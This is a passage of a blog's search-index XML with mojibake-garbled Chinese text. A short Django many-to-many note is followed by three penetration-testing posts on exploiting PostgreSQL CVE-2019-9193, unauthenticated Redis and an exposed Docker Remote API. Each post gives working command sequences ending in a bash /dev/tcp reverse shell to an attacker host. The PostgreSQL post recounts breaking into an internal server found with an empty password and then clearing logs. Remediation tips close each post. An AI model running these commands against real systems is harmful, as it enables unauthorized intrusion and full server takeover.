verbose_name=<span class="hljs-string">'åˆ›å»ºæ—¶é—´'</span>)    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'æ›´æ–°æ—¶é—´'</span>)    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'ç”¨æˆ·å'</span>)    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'æ¿€æ´»çŠ¶æ€'</span>)    role = models.ForeignKey(Role, on_delete=models.CASCADE, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'è§’è‰²'</span>)    groups = models.ManyToManyField(Group, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'ç»„'</span>)</code></pre><p>m2mæ›´æ–°ï¼šm2må­—æ®µæ²¡æœ‰ç›´æ¥æ›´æ–°çš„æ–¹æ³•ï¼Œåªèƒ½é€šè¿‡æ¸…ç©ºå†æ·»åŠ çš„æ–¹æ³•æ›´æ–°äº†</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.groups.clear()_t.groups.add(*[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>])_t.save()</code></pre><ul><li><p>add()ï¼šm2må­—æ®µæ·»åŠ ä¸€ä¸ªå€¼ï¼Œå½“æœ‰å¤šä¸ªå€¼çš„æ—¶å€™å¯ç”¨åˆ—è¡¨ï¼Œå‚ç…§ä¸Šè¾¹ä¾‹å­</p></li><li><p>_t.groups.add(2)</p></li><li><p>_t.groups.add(Group.objects.get(id=2))</p></li><li><p>remove()ï¼šm2må­—æ®µç§»é™¤ä¸€ä¸ªå€¼ï¼Œï¼Œå½“æœ‰å¤šä¸ªå€¼çš„æ—¶å€™å¯ç”¨åˆ—è¡¨ï¼Œå‚ç…§ä¸Šè¾¹ä¾‹å­</p></li><li><p>_t.groups.remove(2)</p></li><li><p>_t.groups.remove(Group.objects.get(id=2))</p></li><li><p>clear()ï¼šæ¸…ç©ºm2må­—æ®µçš„å€¼</p></li></ul><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MDY1MzcyOQ==&mid=2247483702&idx=1&sn=720529d0cd15ecf11e07392d5da33a47&scene=21#wechat_redirect" target="_blank" rel="noopener">ğŸ”—åŸæ–‡é“¾æ¥</a></p>]]></content>
    
    
    <categories>
      
      <category>Django</category>
      
      <category>model</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Django</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PostgreSQLä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨ï¼ˆCVE-2019-9193)</title>
    <link href="/2020/05/25/PostgreSQL%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88CVE-2019-9193/"/>
    <url>/2020/05/25/PostgreSQL%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88CVE-2019-9193/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘æ²¡äº‹æ›°æ›°å†…ç½‘ï¼Œå¶ç„¶å‘ç°äº†ä¸€ä¸ªä½¿ç”¨ç©ºå¯†ç çš„pgï¼ˆæ˜¯çš„ï¼Œè¿çˆ†ç ´éƒ½çœäº†ï¼‰ã€‚ç”¨navicatè¿ä¸Šå»çœ‹äº†ä¸‹å‡ ä¸ªåº“éƒ½æ˜¯ä¸€äº›ä¸šåŠ¡æµ‹è¯•æ•°æ®ï¼Œæ²¡ä»€ä¹ˆå¥½æ”¶é›†ï¼›ä¸æ­»å¿ƒï¼Œgoogleäº†ä¸€ä¸‹å‘ç°æœ‰ä¸ªæ¯”è¾ƒæ–°çš„CVEå¥½åƒå¯ä»¥æ“ä½œä¸€ä¸‹~</p><h4 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h4><p>æœ€è¿‘ï¼Œå®‰å…¨ç ”ç©¶äººå‘˜æŠ«éœ²äº†PostgreSQLå®ä¾‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-9193ï¼‰çš„æ¼æ´ç»†èŠ‚ã€‚å…·æœ‰æ•°æ®åº“ æœåŠ¡å™¨ æ–‡ä»¶è¯»å–æƒé™çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚</p><p>ä»9.3ç‰ˆæœ¬å¼€å§‹ï¼ŒPostgresæ–°å¢äº†ä¸€ä¸ªCOPY TO/FROM PROGRAMåŠŸèƒ½ï¼Œå…è®¸æ•°æ®åº“çš„è¶…çº§ç”¨æˆ·ä»¥åŠpg_read_server_filesç»„ä¸­çš„ä»»ä½•ç”¨æˆ·æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚</p><p>**å—å½±å“çš„ç‰ˆæœ¬ï¼ˆè²Œä¼¼æ›´æ–°ç‰ˆæœ¬æ— è§£ï¼‰</p><p>PostgreSQL&gt; = 9.3**</p><h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><h5 id="pgæ•°æ®åº“è¿æ¥"><a href="#pgæ•°æ®åº“è¿æ¥" class="headerlink" title="pgæ•°æ®åº“è¿æ¥"></a>pgæ•°æ®åº“è¿æ¥</h5><pre><code class="hljs plain"># è¿æ¥postgressqlï¼Œè™½ç„¶æ˜¯å†…ç½‘ipä½†è¿˜æ˜¯æ‰“ä¸€ä¸‹ç å§psql -U postgres -h 172.xx.xxx.xx</code></pre><p><img src="/img/pg_res1.png" srcset="/img/loading.gif" alt="image"></p><h5 id="å¼€å§‹æ”»å‡»ï¼ˆç›´æ¥å¥—ç”¨ç½‘ä¸ŠPOCï¼‰"><a href="#å¼€å§‹æ”»å‡»ï¼ˆç›´æ¥å¥—ç”¨ç½‘ä¸ŠPOCï¼‰" class="headerlink" title="å¼€å§‹æ”»å‡»ï¼ˆç›´æ¥å¥—ç”¨ç½‘ä¸ŠPOCï¼‰"></a>å¼€å§‹æ”»å‡»ï¼ˆç›´æ¥å¥—ç”¨ç½‘ä¸ŠPOCï¼‰</h5><pre><code class="hljs plain"># åˆ é™¤å¹¶åˆ›å»ºç”¨äºä¿å­˜ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œç»“æœçš„è¡¨ DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);# å‘½ä»¤æ‰§è¡Œæµ‹è¯•ï¼Œå¤šè¯•å‡ æ¡COPY cmd_exec FROM PROGRAM &#39;id&#39;;COPY cmd_exec FROM PROGRAM &#39;whoami&#39;;# æŸ¥çœ‹ç»“æœSELECT * FROM cmd_exec;</code></pre><p><img src="/img/pg_res2.png" srcset="/img/loading.gif" alt="image"><br>æˆ‘çš„ğŸï¼Œè¿˜æ˜¯ä¸ªrootç”¨æˆ·ï¼Œï¼Œéƒ½ä¸ç”¨ææƒäº†ï¼ˆè¿™å®‰å…¨æ„è¯†é˜¿ã€‚ã€‚ã€‚ï¼‰</p><h5 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h5><p>è™½ç„¶éƒ½å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ï¼Œæ‹¿ä¸æ‹¿shellæ— æ‰€è°“ï¼Œä½†æ‹¿äº†è¿˜æ˜¯è¦æ–¹ä¾¿ä¸€äº›ï¼›</p><pre><code class="hljs plain"># attackæœºå™¨ä¸Šå¼€å¯ç›‘å¬nc -lvnp 8888# åˆ©ç”¨pgæ‰§è¡Œè¿œç¨‹è¿æ¥å‘½ä»¤COPY cmd_exec FROM PROGRAM &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;8888 0&gt;&amp;1&#39;;</code></pre><p>attackæœºå™¨å·²ç»è¿”å›shellè¿æ¥äº†~<br><img src="/img/pg_res3.png" srcset="/img/loading.gif" alt="image"></p><p>è®°å½•ä¸€ä¸‹ï¼Œé¡ºä¾¿æ¸…é™¤è®°å½•æ”¶å·¥äº†ã€‚</p><h4 id="è§£å†³æ–¹æ¡ˆå»ºè®®"><a href="#è§£å†³æ–¹æ¡ˆå»ºè®®" class="headerlink" title="è§£å†³æ–¹æ¡ˆå»ºè®®"></a>è§£å†³æ–¹æ¡ˆå»ºè®®</h4><p>1ã€pg_read_server_filesï¼Œpg_write_server_fileså’Œpg_execute_server_programè§’è‰²æ¶‰åŠè¯»å–å’Œå†™å…¥å…·æœ‰å¤§æƒé™çš„æ•°æ®åº“æœåŠ¡å™¨æ–‡ä»¶ã€‚å°†æ­¤è§’è‰²æƒé™åˆ†é…ç»™æ•°æ®åº“ç”¨æˆ·æ—¶ï¼Œåº”æ…é‡è€ƒè™‘ã€‚</p><p>2ã€ä½¿ç”¨å¼ºå¯†ç ï¼ï¼ï¼</p><p>3ã€è¿›è¡Œç½‘ç»œéš”ç¦»ï¼Œåªå…è®¸éœ€è¦çš„IPè¿æ¥ï¼›</p><p><a href="https://zhuanlan.zhihu.com/p/143443516" target="_blank" rel="noopener">ğŸ”—çŸ¥ä¹é“¾æ¥</a></p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æµ‹è¯•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redisæœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨</title>
    <link href="/2020/05/25/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2020/05/25/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h4 id="æ¼æ´ç®€ä»‹åŠå±å®³"><a href="#æ¼æ´ç®€ä»‹åŠå±å®³" class="headerlink" title="æ¼æ´ç®€ä»‹åŠå±å®³"></a>æ¼æ´ç®€ä»‹åŠå±å®³</h4><p>Redis é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œè¿™æ ·å°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ Redis è‡ªèº«çš„æä¾›çš„config å‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ /root/.ssh æ–‡ä»¶å¤¹çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€æ·»åŠ è®¡åˆ’ä»»åŠ¡ã€å†™å…¥Webshellç­‰æ“ä½œã€‚</p><h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><h5 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h5><pre><code class="hljs plain"># rediså®‰è£…wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.0.tar.gztar -xvzf redis-3.2.0.tar.gzcd redis-3.2.0make# ä¿®æ”¹é…ç½®æ–‡ä»¶vim redis.conf# bind 127.0.0.1               å‰é¢åŠ ä¸Š#å·    # protected-modeè®¾ä¸ºno protected-mode no# ä¿å­˜é€€å‡º# å¯åŠ¨redis-serverredis-server redis-conf</code></pre><p>è§‚å¯Ÿåˆ°å¦‚ä¸‹è¾“å‡ºï¼Œæ¼æ´ç¯å¢ƒæ­å»ºæˆåŠŸ<br><img src="/img/redis_res1.png" srcset="/img/loading.gif" alt="image"></p><h5 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h5><pre><code class="hljs plain"># åœ¨æ”»å‡»ä¸»æœºä¸Šæ‰“å¼€9999ç«¯å£ç›‘å¬[root@]# nc -vv -l -p 9999</code></pre><h5 id="æœªæˆæƒè®¿é—®éªŒè¯"><a href="#æœªæˆæƒè®¿é—®éªŒè¯" class="headerlink" title="æœªæˆæƒè®¿é—®éªŒè¯"></a>æœªæˆæƒè®¿é—®éªŒè¯</h5><pre><code class="hljs plain"># è¿æ¥é¶æœºredisredis -h target_ip# è·å–redisç‰ˆæœ¬ç­‰ä¿¡æ¯target_ip&gt; info</code></pre><p><img src="/img/redis_res2.png" srcset="/img/loading.gif" alt="image"></p><h5 id="å†™å…¥shell"><a href="#å†™å…¥shell" class="headerlink" title="å†™å…¥shell"></a>å†™å…¥shell</h5><pre><code class="hljs plain"># è®¾ç½®å˜é‡target_ip:6379&gt; set xx &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;9999 0&gt;&amp;1\n&quot;OK# ä¿®æ”¹redisé»˜è®¤ç›®å½•å’Œrdbæ–‡ä»¶target_ip:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cronOKtarget_ip:6379&gt; config set dbfilename rootOKtarget_ip:6379&gt; saveOK</code></pre><h5 id="æˆåŠŸåå¼¹å®¿ä¸»æœºshell"><a href="#æˆåŠŸåå¼¹å®¿ä¸»æœºshell" class="headerlink" title="æˆåŠŸåå¼¹å®¿ä¸»æœºshell"></a>æˆåŠŸåå¼¹å®¿ä¸»æœºshell</h5><p><img src="/img/redis_res3.png" srcset="/img/loading.gif" alt="image"></p><blockquote><p>P.S ï¼Œæµ‹è¯•å®Œè®°å¾—å…³é—­å­˜åœ¨æ¼æ´çš„redis</p></blockquote><h4 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h4><p>æ–¹æ³•ä¸€ï¼š å¯ä»¥ä¿®æ”¹ç»‘å®šçš„IPã€ç«¯å£å’ŒæŒ‡å®šè®¿é—®è€…IP å…·ä½“æ ¹æ®å®é™…æƒ…å†µæ¥è®¾å®šï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨æœåŠ¡å™¨é˜²ç«å¢™ä¸Šåšè®¾ç½®ã€‚</p><p>æ–¹æ³•äºŒï¼š è®¾ç½®è®¿é—®å¯†ç  åœ¨ redis.conf ä¸­æ‰¾åˆ°â€œrequirepassâ€å­—æ®µï¼Œå–æ¶ˆæ³¨é‡Šå¹¶åœ¨åé¢å¡«ä¸Šä½ éœ€è¦çš„å¯†ç ã€‚ æ³¨ï¼šä¿®æ”¹redisçš„é…ç½®éœ€è¦é‡å¯redisæ‰èƒ½ç”Ÿæ•ˆã€‚</p><p>7 <a href="https://zhuanlan.zhihu.com/p/142798377" target="_blank" rel="noopener">ğŸ”—çŸ¥ä¹é“¾æ¥</a></p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æµ‹è¯•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker Remote API æœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨</title>
    <link href="/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h4 id="æ¼æ´ç®€ä»‹åŠå±å®³"><a href="#æ¼æ´ç®€ä»‹åŠå±å®³" class="headerlink" title="æ¼æ´ç®€ä»‹åŠå±å®³"></a>æ¼æ´ç®€ä»‹åŠå±å®³</h4><p>Dockeræ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼Œè®©å¼€å‘è€…å¯ä»¥æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªå¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„LINUXæœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚ Docker swarm æ˜¯ä¸€ä¸ªå°†dockeré›†ç¾¤å˜æˆå•ä¸€è™šæ‹Ÿçš„docker hostå·¥å…·ï¼Œä½¿ç”¨æ ‡å‡†çš„Docker APIï¼Œèƒ½å¤Ÿæ–¹ä¾¿dockeré›†ç¾¤çš„ç®¡ç†å’Œæ‰©å±•ï¼Œç”±dockerå®˜æ–¹æä¾›ã€‚</p><p>Docker Remote API æ˜¯ä¸€ä¸ªå–ä»£è¿œç¨‹å‘½ä»¤è¡Œç•Œé¢ï¼ˆrcliï¼‰çš„REST APIã€‚Docker Remote APIå¦‚é…ç½®ä¸å½“å¯å¯¼è‡´æœªæˆæƒè®¿é—®ï¼Œæ”»å‡»è€…åˆ©ç”¨ docker client æˆ–è€… http ç›´æ¥è¯·æ±‚å°±å¯ä»¥è®¿é—®è¿™ä¸ª APIï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œé»‘å®¢ä¹Ÿå¯ä»¥åˆ é™¤Dockerä¸Šçš„æ•°æ®ã€‚ æ”»å‡»è€…å¯è¿›ä¸€æ­¥åˆ©ç”¨Dockerè‡ªèº«ç‰¹æ€§ï¼Œç›´æ¥è®¿é—®å®¿ä¸»æœºä¸Šçš„æ•æ„Ÿä¿¡æ¯ï¼Œæˆ–å¯¹æ•æ„Ÿæ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œæœ€ç»ˆå®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚</p><h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><h5 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h5><pre><code class="hljs plain"># é¶æœºIP&#x2F;ç«¯å£172.19.101.34 2375# æ“ä½œç³»ç»Ÿlinux_x86</code></pre><h5 id="æœªæˆæƒè®¿é—®æµ‹è¯•"><a href="#æœªæˆæƒè®¿é—®æµ‹è¯•" class="headerlink" title="æœªæˆæƒè®¿é—®æµ‹è¯•"></a>æœªæˆæƒè®¿é—®æµ‹è¯•</h5><pre><code class="hljs plain">docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 images# è¿”å›é•œåƒä¿¡æ¯ï¼Œæ¼æ´å­˜åœ¨</code></pre><h5 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h5><pre><code class="hljs plain"># åœ¨æ”»å‡»ä¸»æœºä¸Šæ‰“å¼€8088ç«¯å£ç›‘å¬[root@]# nc -vv -l -p 8088</code></pre><h5 id="å†™å…¥shell"><a href="#å†™å…¥shell" class="headerlink" title="å†™å…¥shell"></a>å†™å…¥shell</h5><p>åˆ›å»ºå®¹å™¨ï¼Œåˆ©ç”¨bashå’Œcrontabè®¡åˆ’ä»»åŠ¡å‘å®¿ä¸»æœºå†™å…¥shellï¼Œcentosç³»ç»ŸæŒ‚è½½è·¯å¾„ä¸ºã€‚ /var/spool/cron/rootï¼›ubuntuç³»ç»Ÿä¸º/var/spool/cron/crontabs/rootï¼›</p><pre><code class="hljs plain"># æŸ¥çœ‹å®¿ä¸»æœºå¯ç”¨é•œåƒdocker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 images# é€‰æ‹©åˆé€‚é•œåƒåˆ›å»ºå®¹å™¨docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 run -it -v &#x2F;var&#x2F;spool&#x2F;cron&#x2F;:&#x2F;var&#x2F;spool&#x2F;cron&#x2F; image_id &#x2F;bin&#x2F;bash# å¯åŠ¨åˆšåˆšåˆ›å»ºçš„å®¹å™¨å¹¶è¿æ¥docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 start ct_iddocker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 exec -it --user root ct_id &#x2F;bin&#x2F;bash# æ‰§è¡Œshellåå¼¹å‘½ä»¤root@bfd2539dfdc8:&#x2F;# echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;8088 0&gt;&amp;1&#39; &gt;&gt; &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</code></pre><h5 id="æˆåŠŸåå¼¹å®¿ä¸»æœºshell"><a href="#æˆåŠŸåå¼¹å®¿ä¸»æœºshell" class="headerlink" title="æˆåŠŸåå¼¹å®¿ä¸»æœºshell"></a>æˆåŠŸåå¼¹å®¿ä¸»æœºshell</h5><p><img src="/img/docker_res.png" srcset="/img/loading.gif" alt="image"></p><blockquote><p>P.S ï¼Œæµ‹è¯•å®Œè®°å¾—åˆ æ‰å­˜åœ¨æ¼æ´çš„å®¹å™¨</p></blockquote><h4 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h4><p>ä¸´æ—¶è§£å†³æ–¹æ¡ˆï¼š</p><p>1ã€å¯¹2375ç«¯å£åšç½‘ç»œè®¿é—®æ§åˆ¶ï¼Œå¦‚è®¾ç½®iptablesç­–ç•¥ä»…å…è®¸æŒ‡å®šçš„IPæ¥è®¿é—®Dockeræ¥å£ï¼›</p><p>2ã€ä¿®æ”¹docker swarmçš„è®¤è¯æ–¹å¼ï¼Œä½¿ç”¨TLSè®¤è¯ï¼šOverview Swarm with TLS å’Œ Configure Docker Swarm for TLSè¿™ä¸¤ç¯‡æ–‡æ¡£ï¼Œè¯´çš„æ˜¯é…ç½®å¥½TLSåï¼ŒDocker CLI åœ¨å‘é€å‘½ä»¤åˆ°docker daemonä¹‹å‰ï¼Œä¼šé¦–å…ˆå‘é€å®ƒçš„è¯ä¹¦ï¼Œå¦‚æœè¯ä¹¦æ˜¯ç”±daemonä¿¡ä»»çš„CAæ‰€ç­¾åçš„ï¼Œæ‰å¯ä»¥ç»§ç»­æ‰§è¡Œã€‚</p><p><strong>æ€»ä¹‹ã€ä¸è¦å°†ç«¯å£ç›´æ¥æš´éœ²åœ¨å…¬ç½‘ï¼Œå†…ç½‘ä¸­ä½¿ç”¨éœ€è¦è®¾ç½®ä¸¥æ ¼çš„è®¿é—®è§„åˆ™ï¼Œå¹¶ä½¿ç”¨TLSã€‚</strong></p><p><a href="https://zhuanlan.zhihu.com/p/142798377" target="_blank" rel="noopener">ğŸ”—çŸ¥ä¹é“¾æ¥</a></p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æµ‹è¯•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
